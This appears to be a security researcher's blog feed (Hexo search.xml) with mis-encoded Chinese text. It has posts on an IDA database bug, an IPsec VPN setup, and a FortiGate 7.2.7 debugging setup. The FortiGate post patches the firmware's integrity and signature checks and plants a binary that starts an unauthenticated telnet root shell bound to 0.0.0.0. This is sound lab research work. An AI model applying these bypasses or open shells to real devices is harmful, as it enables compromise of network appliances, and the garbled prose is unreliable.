<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>IDA8.4è¿ç§»åˆ°IDA9.0 i64 bug</title>
    <link href="/2025/02/20/IDA8.4%E8%BF%81%E7%A7%BB%E5%88%B0IDA9.0%20i64%20bug/"/>
    <url>/2025/02/20/IDA8.4%E8%BF%81%E7%A7%BB%E5%88%B0IDA9.0%20i64%20bug/</url>
    
    <content type="html"><![CDATA[<h2 id="è®°å½•"><a href="#è®°å½•" class="headerlink" title="è®°å½•"></a>è®°å½•</h2><p>IDA8.4è¿ç§»åˆ°IDA9.0æ—¶ï¼Œdatabaseçš„<code>view&#39;s history</code>å¥½åƒä¼šè¿ç§»å‡ºä¸€ç‚¹é—®é¢˜ï¼Œåœ¨æŒ‰<code>Esc</code>çš„æ—¶å€™ä¼šå‡ºç°å¦‚ä¸‹æŠ¥é”™</p><pre><code class="hljs scala"><span class="hljs-type">Navigation</span> failed. <span class="hljs-type">This</span> can happen <span class="hljs-keyword">if</span> the view<span class="hljs-symbol">&#x27;s</span> history was corrupted. <span class="hljs-type">If</span> you suspect <span class="hljs-keyword">this</span> is a bug, please send <span class="hljs-keyword">this</span> database to &lt;support<span class="hljs-meta">@hex</span>-rays.com&gt;</code></pre><p>è§£å†³åŠæ³•å°±æ˜¯ï¼Œåœ¨<code>IDA9.0</code>ä¸­ï¼Œä¸åœçš„å¾€<code>view&#39;s history</code>é‡Œé¢å †<code>history</code>ï¼Œè¿™æ ·å°±ä¸ä¼šåœ¨<code>Esc</code>æ˜¾ç¤ºæŠ¥é”™äº†</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> ida_kernwin<span class="hljs-keyword">import</span> idaapi<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x10000</span>):    ida_kernwin.ea_viewer_history_push_and_jump(ida_kernwin.get_current_viewer(), idaapi.get_name_ea(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;main&quot;</span>) , <span class="hljs-number">0</span>, i, <span class="hljs-number">0</span>)</code></pre><p>åŠ›å¤§ç –é£ï¼Œåªè¦æˆ‘å¡çš„<code>history</code>å¤Ÿå¤šï¼Œè¿™æ ·<code>Esc</code>å°±æŒ‰ä¸åˆ°æŠ¥é”™ä½ç½®ğŸ¤£</p>]]></content>
    
    
    <categories>
      
      <category>api</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IDA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FortiGate ç¯å¢ƒæ­å»º 7.2.7</title>
    <link href="/2024/03/14/FortiGate%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%207.2.7/"/>
    <url>/2024/03/14/FortiGate%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%207.2.7/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰ç½®"><a href="#å‰ç½®" class="headerlink" title="å‰ç½®"></a>å‰ç½®</h2><p>éƒ¨åˆ†å†…å®¹åœ¨<code>FortiGate ç¯å¢ƒæ­å»º 7.2.4</code>ä¸­ï¼Œæœ¬æ–‡å°†ä¸å†èµ˜è¿°ã€‚æœ¬æ–‡ä»ç„¶ç”¨çš„é‡æ‰“åŒ…çš„æ–¹å¼è·å–<code>shell</code></p><h2 id="FortiGate-é•œåƒä¸‹è½½"><a href="#FortiGate-é•œåƒä¸‹è½½" class="headerlink" title="FortiGate é•œåƒä¸‹è½½"></a>FortiGate é•œåƒä¸‹è½½</h2><p>æœ¬æ–‡æ­å»ºä¸ºå½“å‰æœ€æ–°ç‰ˆ<code>7.2.7</code>çš„<code>FortiGate</code></p><h2 id="ç™»å½•"><a href="#ç™»å½•" class="headerlink" title="ç™»å½•"></a>ç™»å½•</h2><p>è®¾ç½®IP</p><pre><code class="hljs routeros">config<span class="hljs-built_in"> system </span>interface<span class="hljs-builtin-name">edit</span> port1<span class="hljs-builtin-name">set</span> mode static<span class="hljs-builtin-name">set</span><span class="hljs-built_in"> ip </span>192.168.x.x/255.255.255.0end</code></pre><p>ç„¶åé€šè¿‡guiå¼€å¯<code>ssh</code>ã€<code>telnet</code>ç­‰</p><h2 id="æŒ‚è½½-vmdk"><a href="#æŒ‚è½½-vmdk" class="headerlink" title="æŒ‚è½½ vmdk"></a>æŒ‚è½½ vmdk</h2><p><code>sudo guestmount -a FortiGate-7.2.7-disk1.vmdk -m /dev/sda1 --rw ./FGT</code></p><h3 id="flatkc"><a href="#flatkc" class="headerlink" title="flatkc"></a>flatkc</h3><p>ä½¿ç”¨<a href="https://github.com/marin-m/vmlinux-to-elf">vmlinux-to-elf</a>å°†<code>bzImage</code>è½¬æˆ<code>elf</code></p><p>å…¶ä¸­å­˜åœ¨çš„æ£€æµ‹ï¼š</p><ol><li>åœ¨<code>fgt_verify_initrd()</code>ä¸­ï¼Œå¯¹äº<code>rootfs.gz</code>çš„æœ«å°¾0x100å­—èŠ‚ä¸ºç­¾åï¼Œå› æ­¤éœ€è¦<code>patch</code>å…¶è¿”å›å€¼ä¸º<code>0</code>ï¼Œå¹¶ä¸”åœ¨é‡æ‰“åŒ…<code>roofs.gz</code>çš„æœ€ååŠ å…¥0x100ä¸ªå­—èŠ‚</li></ol><p><img src="/img/FortiGate-Setup-7.2.7/fgt_verify_initrd.png" alt="fgt_verify_initrd"></p><ol start="2"><li>åœ¨<code>fos_process_appraise_constprop_0()</code>ä¸­ï¼Œå¯¹äºè¿è¡Œæ–‡ä»¶çš„hashå€¼è¿›è¡Œåˆ¤å®šï¼Œå› æ­¤éœ€è¦åœ¨å‡½æ•°çš„æœ€å¼€å§‹patchæˆ<code>xor rax, rax; ret</code></li></ol><p><img src="/img/FortiGate-Setup-7.2.7/fos_process_appraise_constprop_0.png" alt="fos_process_appraise_constprop_0"></p><p>æœ€åpatch<code>/sbin/init</code>å­—ç¬¦ä¸²å˜æˆ<code>/bin/init</code>ï¼Œè‡ªå·±æ‰‹åŠ¨å¯¹äº<code>rootfs.gz</code>é‡æ‰“åŒ…æ—¶ï¼ŒæŠŠ<code>/sbin/init</code>çš„å·¥ä½œåšäº†ï¼ˆå³è§£å‹<code>bin</code>ã€<code>migadmin</code>ã€<code>node-scripts</code>ã€<code>usr</code>ï¼‰</p><h3 id="bin-init"><a href="#bin-init" class="headerlink" title="/bin/init"></a>/bin/init</h3><p>å­˜åœ¨å¦‚ä¸‹æ£€æµ‹ï¼š</p><ol><li>æ£€æµ‹<code>/data/.db</code>å’Œ<code>.chk</code>ï¼Œå› æ­¤æˆ‘æŠŠä»è°ƒç”¨åˆ°è¿”å›çš„æ¡ä»¶è·³è½¬å…¨éƒ¨patchæˆ<code>nop</code></li></ol><p><img src="/img/FortiGate-Setup-7.2.7/init-main.png" alt="init-main"></p><ol start="2"><li>è¿˜æœ‰ä¸€ä¸ªå¯¹äº<code>/data/.db</code>çš„æ£€æµ‹åœ¨<code>sysfile_moniter</code>ä¸­ï¼ˆè¿™ä¸ªæ˜¯æˆ‘é‡æ‰“åŒ…ä¹‹åï¼Œæœ€åæ‰å‘ç°çš„ï¼Œå› ä¸ºæœ€ååœ¨å‡ºç°<code>login</code>å­—æ®µåï¼Œå‡ºç°äº†<code>System file integrity monitor check failed!\n</code>çš„å­—ç¬¦ä¸²ç„¶åç³»ç»Ÿå…³æœºäº†ï¼Œäºæ˜¯æˆ‘ç»™<code>message</code>å‡½æ•°ä¸‹äº†ä¸ªæ–­ç‚¹ï¼Œæœ€åå®šä½æ‰¾åˆ°äº†ï¼‰ï¼Œå› æ­¤æˆ‘ä¹ŸæŠŠä»è°ƒç”¨åˆ°è¿”å›çš„æ¡ä»¶è·³è½¬å…¨éƒ¨patchæˆ<code>nop</code></li></ol><p><img src="/img/FortiGate-Setup-7.2.7/sysfile_monitor.png" alt="sysfile_monitor"></p><h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><ol><li>é‡æ‰“åŒ…<code>rootfs.gz</code>ï¼š<strong>æ³¨æ„å°¾éƒ¨æ·»åŠ 0x100ä¸ªå­—èŠ‚</strong><ul><li>åˆ©ç”¨<code>chroot . ./bin/xz | ./bin/ftar</code>è§£å‹<code>bin</code>ã€<code>migadmin</code>ã€<code>node-scripts</code>ã€<code>usr</code></li><li>patch init æ–‡ä»¶ä¸­çš„<code>main</code>å’Œ<code>sysfile_monitor</code>ä¸­çš„æ£€æµ‹</li><li>æ·»åŠ <code>/bin/busybox</code>å’Œ<code>/bin/gdbserver</code></li></ul></li><li>è°ƒè¯•è™šæ‹Ÿæœºå†…æ ¸æ—¶ä¿®æ”¹<code>flatkc</code>ä¸­çš„æŒ‡å‘<code>/sbin/init</code>çš„å­—ç¬¦ä¸²ä¸º<code>/bin/init</code></li><li><code>diagnose hardware smartctl</code>å¼€å¯<code>telnet</code></li></ol><pre><code class="hljs c"><span class="hljs-comment">// gcc ./smartctl.c -static -o ./smartctl</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">shell</span><span class="hljs-params">()</span></span>&#123;    system(<span class="hljs-string">&quot;/bin/busybox ls&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    system(<span class="hljs-string">&quot;/bin/busybox id&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    system(<span class="hljs-string">&quot;/bin/busybox killall sshd &amp;&amp; /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    system(<span class="hljs-string">&quot;/bin/busybox sh&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    <span class="hljs-keyword">return</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> *argv[])</span></span><span class="hljs-function"></span>&#123;    shell();    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h3 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h3><p>é¦–å…ˆç»™è™šæ‹Ÿæœºçš„<code>vmx</code>åŠ ä¸Šå¦‚ä¸‹è¯­å¥ï¼Œåˆ©ç”¨<code>debugStub</code>çš„ç‰¹æ€§å¯¹è™šæ‹Ÿæœºè¿›è¡Œè°ƒè¯•</p><pre><code class="hljs ini"><span class="hljs-attr">debugStub.listen.guest64</span> = <span class="hljs-string">&quot;TRUE&quot;</span><span class="hljs-attr">debugStub.listen.guest64.remote</span> = <span class="hljs-string">&quot;TRUE&quot;</span><span class="hljs-attr">debugStub.port.guest64</span> = <span class="hljs-string">&quot;10045&quot;</span><span class="hljs-attr">debugStub.listen.guest32</span> = <span class="hljs-string">&quot;TRUE&quot;</span><span class="hljs-attr">debugStub.listen.guest32.remote</span> = <span class="hljs-string">&quot;TRUE&quot;</span><span class="hljs-attr">debugStub.port.guest32</span> = <span class="hljs-string">&quot;10046&quot;</span><span class="hljs-attr">toolsInstallManager.updateCounter</span> = <span class="hljs-string">&quot;2&quot;</span><span class="hljs-attr">tools.remindInstall</span> = <span class="hljs-string">&quot;FALSE&quot;</span></code></pre><p>è§£å‹<code>rootfs</code>ï¼Œç›´æ¥ç”¨<code>cpio -idmv &lt; ../rootfs</code></p><p>è§£å‹çš„æ—¶å€™<code>xz</code>ä¸ºå…¶è‡ªå·±å®ç°çš„ï¼Œå› æ­¤è¦ç”¨å¦‚ä¸‹æŒ‡ä»¤ï¼Œå°†å‹ç¼©çš„å…¨éƒ¨è§£å‹</p><pre><code class="hljs awk">chroot . <span class="hljs-regexp">/sbin/</span>xz -d usr.tar.xzchroot . <span class="hljs-regexp">/sbin/</span>ftar -xf ./usr.tar</code></pre><p>é‡æ‰“åŒ…çš„æŒ‡ä»¤å¦‚ä¸‹</p><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> . | cpio -o <span class="hljs-attribute">--format</span>=newc &gt; rootfs gzip rootfsdd <span class="hljs-attribute">if</span>=/dev/zero <span class="hljs-attribute">bs</span>=1 <span class="hljs-attribute">count</span>=256 &gt;&gt; rootfs.gzguestmount -a FortiGate-7.2.7-disk1.vmdk -m /dev/sda1 --rw ./FGTcd FGTcp <span class="hljs-built_in">..</span>/xxx/rootfs.gz ./cd <span class="hljs-built_in">..</span>umount FortiGate</code></pre><p>åœ¨å¼€å¯<code>FortiGate</code>ä¹‹åå‡ºç°å¦‚ä¸‹å­—æ ·åï¼ˆå¦‚æœæ²¡æ–­æˆåŠŸä¼šé‡å¯å†æ–­ä¸‹æ¥çš„ï¼‰ï¼Œè¿›è¡Œè¿œç¨‹è°ƒè¯•ï¼Œæ–­åœ¨<code>fgt_verify_initrd()</code>çš„è¿”å›ï¼Œä¿®æ”¹å…¶è¿”å›å€¼ï¼Œå¹¶ä¿®æ”¹å…¶å­—ç¬¦ä¸²ä¸º<code>/bin/init\x00</code></p><pre><code class="hljs erlang-repl">Loading flatkc... okLoading rootfs.gz... ok</code></pre><p>ä»¥ä¸‹æ˜¯å†™çš„ä¸€ä¸ª<code>script</code>ï¼ˆæ³¨æ„è¿™é‡Œ<code>debugStub</code>èµ·çš„æ˜¯ä¸»æœºçš„ç«¯å£ï¼‰</p><pre><code class="hljs routeros">target remote 192.168.152.1:10045<span class="hljs-comment"># modify return value</span>b <span class="hljs-number">*0</span>xffffffff8170b5ce<span class="hljs-comment"># modify to /bin/init</span><span class="hljs-comment"># b *0xFFFFFFFF80C5D339</span><span class="hljs-comment"># b *0x452c2e</span>define patch    <span class="hljs-builtin-name">set</span> <span class="hljs-variable">$rax</span>=0    <span class="hljs-builtin-name">set</span> &#123;char [10]&#125;<span class="hljs-attribute">0xFFFFFFFF813CB87C</span>=<span class="hljs-string">&quot;/bin/init&quot;</span>    <span class="hljs-builtin-name">set</span> *(char *)<span class="hljs-attribute">0xFFFFFFFF80541C64</span>=0x31    <span class="hljs-builtin-name">set</span> *(char *)<span class="hljs-attribute">0xFFFFFFFF80541C65</span>=0xC0    <span class="hljs-builtin-name">set</span> *(char *)<span class="hljs-attribute">0xFFFFFFFF80541C66</span>=0xC3    x/s 0xFFFFFFFF813CB87C    cendc</code></pre><h2 id="æœ€ç»ˆæ•ˆæœ"><a href="#æœ€ç»ˆæ•ˆæœ" class="headerlink" title="æœ€ç»ˆæ•ˆæœ"></a>æœ€ç»ˆæ•ˆæœ</h2><p><img src="/img/FortiGate-Setup-7.2.7/7.2.7-shell.png" alt="7.2.7-shell"></p><h2 id="gdbserver"><a href="#gdbserver" class="headerlink" title="gdbserver"></a>gdbserver</h2><p>è°ƒæ•´telnetåˆ°162ç«¯å£ï¼Œgdbserverèµ·åœ¨161ç«¯å£ï¼Œå¯ä»¥å¼€å¯<code>snmpd</code>çš„<code>SNMP Agent</code>ä»¥åŠ<code>v2c</code>ï¼Œå¯¹äº<code>interface port1</code>ä¹Ÿå¼€å¯<code>SNMP</code>ï¼Œç„¶å<code>killall -9 snmpd &amp;&amp; /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 162</code>ï¼Œå†åœ¨<code>web</code>ä¸­å…³é—­<code>snmpd</code>ï¼Œå°±å¯ä»¥è¿æ¥<code>telnet ip 162</code>äº†ï¼Œè¿™æ ·<code>gdbserver</code>å°±å¯ä»¥æ˜¯ç”¨161ç«¯å£</p><p>å†é€šè¿‡<code>killall -9 sshd</code>ï¼Œé‡å¯<code>sshd</code></p><h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><p>patch init ç›´æ¥ç”¨ radare2 ï¼Œéå¸¸çš„æ–¹ä¾¿</p><p><code>FortiGate</code>ä¸­ä¸€äº›é‡å¯çš„åŒ…è£…å‡½æ•°ä¸º<code>flatkc</code>ä¸­çš„<code>kernel_restart</code>å’Œ<code>init</code>ä¸­çš„<code>do_halt</code>ã€<code>reboot(xxxx)</code></p><p>vmware debugstub æ–­ç‚¹åªèƒ½ä¸‹å››ä¸ªï¼Œå› ä¸ºæ˜¯ä¸‹çš„ç¡¬ä»¶æ–­ç‚¹ï¼Œè¿™ä¸ªæŠ˜ç£¨äº†æˆ‘å¥½ä¹…ï¼Œæœ€åæˆ‘å‘ç°åªèƒ½ä¸‹å‡ ä¸ªæ–­ç‚¹ä¹‹åï¼Œf1ys0arå¸ˆå…„æ‰å‘Šè¯‰æˆ‘å› ä¸ºç¡¬ä»¶æ–­ç‚¹ï¼ˆæƒ³æ­»çš„å¿ƒéƒ½æœ‰äº†</p><p>ä¸€äº›æ£€æµ‹æ˜¯<code>plusls</code>å½“åˆå¸®æˆ‘åˆ¶ä½œ<code>7.2.6</code>çš„<code>shell</code>æ—¶å€™å‘Šè¯‰æˆ‘çš„ï¼Œæ„Ÿè°¢<code>plusls</code>å¤§ä½¬</p><p><code>&gt;= 7.4.0</code>æ˜¯ç”¨çš„<code>chacha20</code>å¯¹äº<code>rootfs.gz</code>è¿›è¡ŒåŠ å¯†çš„ï¼Œå½“æ—¶å‘ç°è°ƒè¯•æ—¶è§£å¯†çš„å¯†é’¥å’Œæˆ‘ç›´æ¥ç”¨<code>flatkc</code>æå–çš„ä¸ä¸€æ ·ï¼Œæœ€åå‘ç°æ˜¯æ²¡ç”¨<code>.encode(&quot;raw_unicode_escape&quot;)</code>çš„é”…ï¼Œç›´æ¥å¯¼è‡´è½¬æ¢é”™è¯¯</p><p>æœ€åæ„Ÿè°¢<code>swing</code>å’Œ<code>m4x</code>å¤§å“¥å¬æˆ‘ä¸€è·¯è¸©å‘</p><h2 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h2><blockquote><p><a href="https://www.optistream.io/blogs/tech/fortigate-firmware-analysis">https://www.optistream.io/blogs/tech/fortigate-firmware-analysis</a><br><a href="https://paper.seebug.org/3129/">https://paper.seebug.org/3129/</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>setup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>FortiGate</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FortiGate IPsec VPN æ­å»º</title>
    <link href="/2023/10/21/FortiGate%20IPsec%20VPN%20%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/10/21/FortiGate%20IPsec%20VPN%20%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>è¯¥åšå®¢ä¸»è¦è®°å½•ï¼Œåœ¨<code>FortiGateä¸Š</code>æ­å»º<code>IPsec VPN</code>çš„è¿‡ç¨‹ï¼Œä¸»è¦æœ€ç»ˆå®ç°äº†å¯¹äº<code>site-to-site</code>ï¼ˆ<code>FortiGate-to-FortiGate</code>ï¼‰å’Œ<code>host-to-site</code>ï¼ˆ<code>Windows10-to-FortiGate</code>ï¼‰çš„æ­å»º</p><h2 id="æ•´ä½“çš„ç½‘ç»œæ‹“æ‰‘ç»“æ„"><a href="#æ•´ä½“çš„ç½‘ç»œæ‹“æ‰‘ç»“æ„" class="headerlink" title="æ•´ä½“çš„ç½‘ç»œæ‹“æ‰‘ç»“æ„"></a>æ•´ä½“çš„ç½‘ç»œæ‹“æ‰‘ç»“æ„</h2><p><img src="/img/FortiGate-IPsec-VPN-Setup/network-topology-diagram.png" alt="ç½‘ç»œæ‹“æ‰‘"></p><p><code>FortiGate 1</code>ï¼šç½‘ç»œé€‚é…å™¨1è®¾ç½®ä¸º<code>NAT</code>ï¼ˆ<code>192.168.152.0/24</code>ï¼‰ï¼Œç½‘ç»œé€‚é…å™¨2è®¾ç½®ä¸º<code>VMnet1</code>ï¼ˆ<code>192.168.159.0/24</code>ï¼‰<br><code>FortiGate 2</code>ï¼šç½‘ç»œé€‚é…å™¨1è®¾ç½®ä¸º<code>NAT</code>ï¼ˆ<code>192.168.152.0/24</code>ï¼‰ï¼Œç½‘ç»œé€‚é…å™¨2è®¾ç½®ä¸º<code>VMnet3</code>ï¼ˆ<code>192.168.200.0/24</code>ï¼‰<br><code>pc1</code>ï¼šç½‘ç»œé€‚é…å™¨è®¾ç½®ä¸º<code>VMnet1</code>ï¼ˆ<code>192.168.159.0/24</code>ï¼‰<br><code>pc2</code>ï¼šç½‘ç»œé€‚é…å™¨è®¾ç½®ä¸º<code>VMnet3</code>ï¼ˆ<code>192.168.200.0/24</code>ï¼‰</p><p>åœ¨é…ç½®<code>host-to-site</code>æ—¶ï¼Œä¼šåœ¨<code>NAT</code>ä¸Šå†è¿æ¥ä¸€ä¸ª<code>windows10</code>çš„æœºå™¨</p><p><strong>æ³¨ï¼š</strong> <code>pc1</code>çš„ç½‘å…³éœ€è¦è®¾ç½®ä¸º<code>192.168.159.3</code>ï¼Œ<code>pc2</code>çš„ç½‘ç»œéœ€è¦è®¾ç½®ä¸º<code>192.168.200.3</code>ï¼Œå¦åˆ™<code>pc1</code>ä¼šé€šè¿‡<code>192.168.159.2</code>ç›´æ¥<code>ping</code>åˆ°<code>pc2</code></p><h2 id="FortiGate1çš„é…ç½®"><a href="#FortiGate1çš„é…ç½®" class="headerlink" title="FortiGate1çš„é…ç½®"></a>FortiGate1çš„é…ç½®</h2><h3 id="é…ç½®-port1-å’Œ-port2"><a href="#é…ç½®-port1-å’Œ-port2" class="headerlink" title="é…ç½® port1 å’Œ port2"></a>é…ç½® port1 å’Œ port2</h3><p>é¦–å…ˆå¯¹äº<code>port1</code>å’Œ<code>port2</code>æœ‰å¦‚ä¸‹è®¾ç½®</p><p><code>port1</code>ä¸ç”¨è®¾ç½®<code>DHCP Server</code></p><p><img src="/img/FortiGate-IPsec-VPN-Setup/FortiGate1-Interface-port1.png" alt="port1"></p><p><code>port2</code>è®¾ç½®<code>DHCP Server</code></p><p><img src="/img/FortiGate-IPsec-VPN-Setup/FortiGate1-Interface-port2.png" alt="port2"></p><h3 id="é…ç½®-NAT-å’Œ-Firewall"><a href="#é…ç½®-NAT-å’Œ-Firewall" class="headerlink" title="é…ç½® NAT å’Œ Firewall"></a>é…ç½® NAT å’Œ Firewall</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦ä½¿å¾—å†…ç½‘çš„æµé‡èƒ½èµ°å‡ºå»ï¼Œå› æ­¤è®¾ç½®<code>NAT</code>å’Œæµé‡çš„è½¬å‘</p><p><img src="/img/FortiGate-IPsec-VPN-Setup/FortiGate1-NAT.png" alt="NAT"></p><p><img src="/img/FortiGate-IPsec-VPN-Setup/FortiGate1-Firewall-Policy.png" alt="Firewall-Policy"></p><p><strong>æ³¨ï¼š</strong> è¿™é‡Œçš„<code>NAT</code>æœ‰ä¸€äº›å¹¶ä¸åœ¨<code>Central SNAT</code>çš„åœ°æ–¹å¼€å¯ï¼Œè€Œåœ¨<code>Firewall Policy</code>ä¸­å¼€å¯</p><h3 id="é…ç½®-IPSec-VPN-site-to-siteï¼ˆFortiGate1-to-FortiGate2ï¼‰"><a href="#é…ç½®-IPSec-VPN-site-to-siteï¼ˆFortiGate1-to-FortiGate2ï¼‰" class="headerlink" title="é…ç½® IPSec VPN site-to-siteï¼ˆFortiGate1-to-FortiGate2ï¼‰"></a>é…ç½® IPSec VPN site-to-siteï¼ˆFortiGate1-to-FortiGate2ï¼‰</h3><p>åœ¨<code>IPSec Tunnels</code>ä¸­é€‰æ‹©<code>Site-To-Site</code>è¿›è¡Œé…ç½®</p><p><img src="/img/FortiGate-IPsec-VPN-Setup/FortiGate1-IPSec-Wizard-VPN-Setup.png" alt="FortiGate1-IPSec-Wizard-VPN-Setup"></p><p>æˆ‘ä»¬è®¾ç½®<code>FortiGate2</code>çš„ç«¯å£åœ°å€ä»¥åŠé¢„å…±äº«å¯†é’¥</p><p><strong>æ³¨ï¼š</strong> è¿™é‡Œæ˜¾ç¤ºå†²çªï¼Œå› ä¸ºæˆ‘ä¹‹å‰å·²ç»é…å¥½äº†ï¼Œæ‰€ä»¥æ‰ä¼šæ˜¾ç¤º<code>Duplicate entry found.</code></p><p><img src="/img/FortiGate-IPsec-VPN-Setup/FortiGate1-IPSec-Wizard-Authentication.png" alt="FortiGate1-IPSec-Wizard-Authentication"></p><p>è®¾ç½®æœ¬åœ°çš„å­ç½‘å’Œè¿œç¨‹çš„å­ç½‘</p><p><img src="/img/FortiGate-IPsec-VPN-Setup/FortiGate1-IPSec-Wizard-Policy-Routing.png" alt="FortiGate1-IPSec-Wizard-Policy-Routing"></p><p>æœ€åä¼šå¦‚ä¸‹æ˜¾ç¤ºï¼Œå¦‚æœ<code>Create</code>ä¹‹åï¼ŒæˆåŠŸäº†ï¼Œè¯´æ˜é…ç½®<strong>æš‚æ—¶ï¼ˆç†è®ºä¸Šï¼‰</strong>æ²¡é—®é¢˜</p><p><img src="/img/FortiGate-IPsec-VPN-Setup/FortiGate1-IPSec-Wizard-Review.png" alt="FortiGate1-IPSec-Wizard-Review"></p><p>è¿™ä¸ªæ—¶å€™æ²¡æœ‰è¿æ¥çš„è¯ï¼Œä¼šæ˜¾ç¤º<code>Inactive</code>ï¼Œè€Œå¦‚æœå·²ç»è¿æ¥çš„è¯ä¼šæ˜¾ç¤º<code>up</code></p><p><img src="/img/FortiGate-IPsec-VPN-Setup/FortiGate1-IPSec-Tunnels.png" alt="IPSec-Tunnels"></p><p>æˆ‘ä»¬æ¥ä¸‹æ¥å°†å…¶è½¬æ¢æˆ<code>Custom</code>æ¥çœ‹çœ‹å…¶å…·ä½“é…ç½®æ˜¯ä»€ä¹ˆï¼Œå³å¦‚æœç›´æ¥ç”¨<code>custom</code>é…ç½®çš„è¯ï¼Œåº”è¯¥å¦‚ä½•åš</p><p><img src="/img/FortiGate-IPsec-VPN-Setup/FortiGate1-Edit.png" alt="FortiGate1-Edit"></p><p>å¯ä»¥çœ‹åˆ°è¿œç¨‹ç½‘å…³åœ°å€ï¼Œå¯¹åº”ç«¯å£ï¼Œè®¤è¯æ–¹æ³•ï¼Œ<code>ike</code>ç‰ˆæœ¬ï¼Œæ¨¡å¼ï¼Œé˜¶æ®µä¸€åå•†ç”¨çš„ç®—æ³•ï¼Œ<code>DH Groups</code>ç»„æ•°ï¼Œé˜¶æ®µäºŒçš„é…ç½®</p><p><img src="/img/FortiGate-IPsec-VPN-Setup/FortiGate1-FortiGate2-Custom.png" alt="FortiGate1-FortiGate2-Custom"></p><p>åœ¨<code>FortiGate2</code>ä¹Ÿå¦‚æ³•ç‚®åˆ¶çš„é…ç½®ä¸€éå³å¯</p><p><img src="/img/FortiGate-IPsec-VPN-Setup/FortiGate2-FortiGate1-Custom.png" alt="FortiGate2-FortiGate1-Custom"></p><p><strong>æ³¨ï¼š</strong> å¯¹äº<code>site-to-site</code>ä¸­çš„<code>Inactive</code>å›¾æ ‡çš„åœ°æ–¹ï¼Œå¯ä»¥<strong>å•å‡»</strong>ç‚¹è¿›å»ï¼Œä½¿ç”¨<code>Bring up</code>å°†å…¶å¯åŠ¨</p><h3 id="é…ç½®-IPSec-VPN-host-to-siteï¼ˆwin10-to-FortiGate1ï¼‰"><a href="#é…ç½®-IPSec-VPN-host-to-siteï¼ˆwin10-to-FortiGate1ï¼‰" class="headerlink" title="é…ç½® IPSec VPN host-to-siteï¼ˆwin10-to-FortiGate1ï¼‰"></a>é…ç½® IPSec VPN host-to-siteï¼ˆwin10-to-FortiGate1ï¼‰</h3><p>åœ¨<code>IPSec Tunnels</code>ä¸­é€‰æ‹©<code>Remote Access</code>è¿›è¡Œé…ç½®</p><p><img src="/img/FortiGate-IPsec-VPN-Setup/FortiGate1-Win10-VPN-Setup.png" alt="FortiGate1-Win10-VPN-Setup"></p><p>è¿™é‡Œéœ€è¦æå‰è®¾ç½®ä¸€ä¸ª<code>L2TP_Group</code>ï¼Œ<code>Group</code>ç±»å‹æ˜¯é˜²ç«å¢™ï¼Œè®¾ç½®ä¸€ä¸ªç”¨æˆ·<code>win1</code></p><p><img src="/img/FortiGate-IPsec-VPN-Setup/FortiGate1-Win10-VPN-Authentication.png" alt="FortiGate1-Win10-VPN-Authentication"></p><p><strong>æ³¨ï¼š</strong> è¿™é‡Œçš„<code>Client Address Range</code>æ˜¯<code>IPSec VPN</code>è¿æ¥è¿‡æ¥ä¹‹åï¼Œè¿™ä¸ª<code>FortiGate1</code>ä¼šç»™è¿™ä¸ªç”¨æˆ·åˆ†é…çš„åœ°å€èŒƒå›´æ˜¯ä»€ä¹ˆï¼Œè¿™é‡Œæˆ‘åŸæ¥è®¾ç½®ä¸ºå­ç½‘<code>192.168.159.0/24</code>ä¸æˆåŠŸï¼Œæ‰€ä»¥æ‰å¦‚æ­¤è®¾ç½®ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥è‡ªè¡Œå†æ¬¡å°è¯•æ˜¯å¦å¯ä»¥ä¸º<code>192.168.159.0/24</code></p><p><img src="/img/FortiGate-IPsec-VPN-Setup/FortiGate1-Win10-VPN-Policy-Routing.png" alt="FortiGate1-Win10-VPN-Policy-Routing"></p><p><img src="/img/FortiGate-IPsec-VPN-Setup/FortiGate1-Win10-VPN-Review.png" alt="FortiGate1-Win10-VPN-Review"></p><p><img src="/img/FortiGate-IPsec-VPN-Setup/FortiGate1-Win10-VPN-Custom.png" 